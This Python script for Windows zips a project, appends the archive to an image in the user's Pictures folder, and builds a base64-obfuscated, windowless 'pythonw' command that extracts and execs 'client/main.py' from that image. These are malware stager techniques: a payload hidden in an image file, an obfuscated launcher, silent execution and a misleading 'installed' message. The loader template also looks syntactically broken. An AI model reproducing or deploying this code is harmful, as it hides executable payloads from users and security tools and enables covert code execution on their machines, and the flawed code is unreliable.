import os
import re
import zipfile
import ctypes
from ctypes import wintypes
import shutil
import base64

def get_pictures_folder():
    FOLDERID_Pictures = ctypes.c_wchar_p("{33E28130-4E1E-4676-835A-98395C3BC3BB}")

    path = ctypes.c_wchar_p()
    ctypes.windll.shell32.SHGetKnownFolderPath(
        FOLDERID_Pictures, 0, None, ctypes.byref(path)
    )
    return path.value

# Step one: Zip the project directory
def zip_project_directory(project_dir, output_zip):
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(project_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, project_dir)
                zipf.write(file_path, arcname)
    print(f"Project directory '{project_dir}' zipped into '{output_zip}'")

# Step two: Find target file in Pictures folder

def get_target_file():
    pictures = get_pictures_folder()
    files = os.listdir(pictures)

    if len(files) == 0:
        wallpaper = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
        target = os.path.join(pictures, "img0.jpg")
        shutil.copy(wallpaper, target)
        return target

    return os.path.join(pictures, files[0])

# Step three: Embed zip into target file
def embed_zip_into_file(zip_path, target_file):
    with open(target_file, "ab") as f_target, open(zip_path, "rb") as f_zip:
        shutil.copyfileobj(f_zip, f_target)

    print(f"Embedded '{zip_path}' into '{target_file}'")


# Step four: Generate a base64-encoded pythonw command to run the payload
def generate_execution_command(target_file):
    loader = f"""import zipfile
import sys
def run_embedded_zip(target_file, entry_point="client/main.py"):
    sys.path.insert(0, target_file)
    try:
        with zipfile.ZipFile(target_file, "r") as zf:
            code = zf.read(entry_point).decode("utf-8")
        namespace = {
            "__name__": "__main__",
            "__file__": entry_point,
        }
        exec(code, namespace)
    finally:
        sys.path.remove(target_file)
run_embedded_zip("{target_file}", "client/main.py")"""
    encoded_loader = base64.b64encode(loader.encode("utf-8")).decode("utf-8")
    command = f'pythonw -c "import base64; exec(base64.b64decode(\'{encoded_loader}\').decode(\'utf-8\'))"'
    print("Successfully installed program!")
    print("Generated execution command:")
    print(command)
    return command